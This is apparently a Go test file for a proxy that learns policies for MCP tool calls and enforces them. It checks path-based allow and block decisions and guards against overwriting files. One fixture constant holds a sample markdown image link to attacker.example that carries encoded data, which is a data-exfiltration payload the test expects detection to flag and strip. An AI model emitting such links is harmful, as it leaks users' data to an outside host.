package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/DreadpiratePickles/rover/internal/daemon"
	"github.com/DreadpiratePickles/rover/internal/ipc"
	"github.com/DreadpiratePickles/rover/internal/jsonrpc"
	"github.com/DreadpiratePickles/rover/internal/policy"
)

// poisonText is a file whose contents detection rates high: reading it is
// the "flagged call" of the M6 acceptance test.
const poisonText = "Done. ![x](https://attacker.example/c?d=c2VjcmV0)\n"

func writeFile(t *testing.T, path, data string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
		t.Fatal(err)
	}
}

// learnSession records a session in observe mode: echo-server wrapped as
// "files", read_file's path and (the verifier's H1 scenario) echo's text
// normalised as paths, echo called on the projects directory itself.
func learnSession(t *testing.T, dir string) {
	t.Helper()
	if out, err := run(dir, "policy", "init"); err != nil {
		t.Fatalf("policy init: %v\n%s", err, out)
	}
	cfgDir := filepath.Join(dir, "config")
	writeFile(t, filepath.Join(cfgDir, "normalizers.yaml"), "servers:\n  files:\n    read_file: {path: path}\n    echo: {text: path}\n")
	f, err := os.OpenFile(filepath.Join(cfgDir, "config.yaml"), os.O_APPEND|os.O_WRONLY, 0o600) //nolint:gosec // G304: test's ROVER_DIR
	if err != nil {
		t.Fatal(err)
	}
	_, _ = f.WriteString("normalizers: normalizers.yaml\n")
	_ = f.Close()
	startDaemon(t, dir)

	m := &mcp{t: t, cmd: exec.Command(bins.rover, "wrap", "--name", "files", "--", bins.echo)} //nolint:gosec // G204: test runs the binaries it built
	m.cmd.Env = env(dir, "ROVER_TEST_NO_AUTOSTART=1")
	m.in, _ = m.cmd.StdinPipe()
	stdout, _ := m.cmd.StdoutPipe()
	m.out = bufio.NewReader(stdout)
	m.cmd.Stderr = &m.stderr
	if err := m.cmd.Start(); err != nil {
		t.Fatal(err)
	}
	defer m.close()
	m.request(`{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"0"}}}`, 1)
	m.request(`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`, 2)
	for i, p := range []string{"projects/a.txt", "projects/sub/../sub/b.txt"} {
		r := m.request(readFile(i+3, filepath.Join(dir, p)), i+3)
		if !strings.Contains(fmt.Sprint(r["result"]), "data") {
			t.Fatalf("observe mode must forward %s: %v", p, r)
		}
	}
	m.request(echo(5, filepath.Join(dir, "projects")), 5)
	if r := m.request(readFile(6, filepath.Join(dir, "loot", "poison.txt")), 6); !strings.Contains(fmt.Sprint(r["result"]), "Rover removed content") {
		t.Fatalf("the poisoned result must be replaced: %v", r)
	}
}

func echo(id int, path string) string {
	return fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":"tools/call","params":{"name":"echo","arguments":{"text":%q}}}`, id, path)
}

func readFile(id int, path string) string {
	return fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"method":"tools/call","params":{"name":"read_file","arguments":{"path":%q}}}`, id, path)
}

// Acceptance (M6): a session recorded in observe mode becomes a proposal
// that, once its suggested root is added, permits that session's calls and
// denies a path one directory outside them; the call whose result detection
// flagged is listed as suspicious and is not in the proposal.
func TestLearnModeEndToEnd(t *testing.T) {
	// Arrange
	dir := roverDir(t)
	writeFile(t, filepath.Join(dir, "projects", "a.txt"), "data a\n")
	writeFile(t, filepath.Join(dir, "projects", "sub", "b.txt"), "data b\n")
	writeFile(t, filepath.Join(dir, "other", "c.txt"), "data c\n")
	writeFile(t, filepath.Join(dir, "loot", "poison.txt"), poisonText)
	learnSession(t, dir)

	// Act: propose while roverd runs (observations_dump over the socket).
	out, err := run(dir, "policy", "propose", "--yaml")

	// Assert
	if err != nil {
		t.Fatalf("propose: %v\n%s", err, out)
	}
	cedar, _, _ := strings.Cut(out, "\n# ") // the YAML section (or its "no YAML" note) starts with "# "
	for _, want := range []string{`@id("learned-files-read_file")`, `@id("learned-files-echo")`, `@id("learned-files-list-tools")`,
		"context.norm.path.under_projects == true", "context.norm.text.under_projects == true", "derived from 2 calls between"} {
		if !strings.Contains(cedar, want) {
			t.Errorf("proposal lacks %q:\n%s", want, out)
		}
	}
	if strings.Contains(cedar, "loot") || strings.Contains(cedar, "poison") {
		t.Fatalf("the flagged call reached the proposal:\n%s", cedar)
	}
	_, suspicious, ok := strings.Cut(out, "suspicious, not proposed:\n")
	if !ok || !strings.Contains(strings.SplitN(suspicious, "\n", 2)[0], "files  read_file  flags: markdown_exfil_url") {
		t.Fatalf("suspicious section:\n%s", out)
	}
	// No roots are declared, yet paths are resolved (M6 fix M4): the
	// suggested root is /private/tmp/... on macOS.
	realDir, err := filepath.EvalSymlinks(dir)
	if err != nil {
		t.Fatal(err)
	}
	root := filepath.Join(realDir, "projects")
	if !strings.Contains(out, "roots to add to config.yaml:\n  projects: \""+root+"\"\n") || !strings.Contains(out, "(new root projects = "+root+")") {
		t.Fatalf("root suggestion / YAML:\n%s", out)
	}
	if dout, derr := run(dir, "policy", "diff"); derr == nil || !strings.Contains(dout, "+++ proposal") || !strings.Contains(dout, `+@id("learned-files-read_file")`) {
		t.Fatalf("diff against the starter policy must differ (exit 1): %v\n%s", derr, dout)
	}

	// Apply by hand: the proposal as policy.cedar, the root in config.yaml.
	cfgDir := filepath.Join(dir, "config")
	if pout, perr := run(dir, "policy", "propose", "--force", "--out", filepath.Join(cfgDir, "policy.cedar")); perr != nil {
		t.Fatalf("propose --out: %v\n%s", perr, pout)
	}
	cfgPath := filepath.Join(cfgDir, "config.yaml")
	cfgText, err := os.ReadFile(cfgPath) //nolint:gosec // G304: test's ROVER_DIR
	if err != nil {
		t.Fatal(err)
	}
	writeFile(t, cfgPath, strings.Replace(string(cfgText), "\nroots: {}\n", "\nroots:\n  projects: \""+root+"\"\n", 1))
	if out, err := run(dir, "policy", "validate"); err != nil || !strings.Contains(out, "ok: 3 policies") {
		t.Fatalf("validate: %v\n%s", err, out)
	}
	assertDecisions(t, dir, map[string]string{
		`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`:                    ipc.ActionForward,
		readFile(2, filepath.Join(dir, "projects", "a.txt")):                ipc.ActionForward,
		readFile(3, filepath.Join(dir, "projects", "sub", "b.txt")):         ipc.ActionForward,
		echo(4, filepath.Join(dir, "projects")):                             ipc.ActionForward,
		echo(8, filepath.Join(dir, "other")):                                ipc.ActionBlock,
		echo(9, "../other/c.txt"):                                           ipc.ActionBlock,
		readFile(5, filepath.Join(dir, "other", "c.txt")):                   ipc.ActionBlock,
		readFile(6, filepath.Join(dir, "loot", "poison.txt")):               ipc.ActionBlock,
		readFile(7, filepath.Join(dir, "projects", "..", "other", "c.txt")): ipc.ActionBlock,
	})
}

// assertDecisions loads the policy as roverd would and checks each message
// in enforce mode.
func assertDecisions(t *testing.T, dir string, want map[string]string) {
	t.Helper()
	cfgDir := filepath.Join(dir, "config")
	file := filepath.Join(cfgDir, "policy.cedar")
	cfg, err := loadConfig(cfgDir, file)
	if err != nil {
		t.Fatal(err)
	}
	l, err := loadPolicy(file, cfgDir, cfg)
	if err != nil {
		t.Fatal(err)
	}
	l.cfg.Mode = policy.ModeEnforce
	for msg, action := range want {
		m := jsonrpc.Parse([]byte(msg))
		o := l.engine.Decide(daemon.InputFor(l.cfg, "files", "stdio", policy.DirC2S, m, "test", "0", policy.SessionCtx{}, time.Now()))
		if o.Action != action {
			t.Errorf("%s: %s (%s), want %s", msg, o.Action, o.Reason, action)
		}
	}
}

// `propose --out` never overwrites a file (policy.cedar, say) unless --force.
func TestProposeOutRefusesToOverwrite(t *testing.T) {
	dir := roverDir(t)
	if out, err := run(dir, "policy", "init"); err != nil {
		t.Fatalf("init: %v\n%s", err, out)
	}
	target := filepath.Join(dir, "config", "policy.cedar")
	before, err := os.ReadFile(target) //nolint:gosec // G304: test's ROVER_DIR
	if err != nil {
		t.Fatal(err)
	}
	if out, err := run(dir, "policy", "propose", "--out", target); err == nil || !strings.Contains(out, "--force") {
		t.Fatalf("overwrite without --force: %v\n%s", err, out)
	}
	if after, _ := os.ReadFile(target); string(after) != string(before) { //nolint:gosec // G304: test's ROVER_DIR
		t.Fatal("the existing file was changed")
	}
	if out, err := run(dir, "policy", "propose", "--force", "--out", target); err != nil || !strings.Contains(out, "wrote") {
		t.Fatalf("--force: %v\n%s", err, out)
	}
}
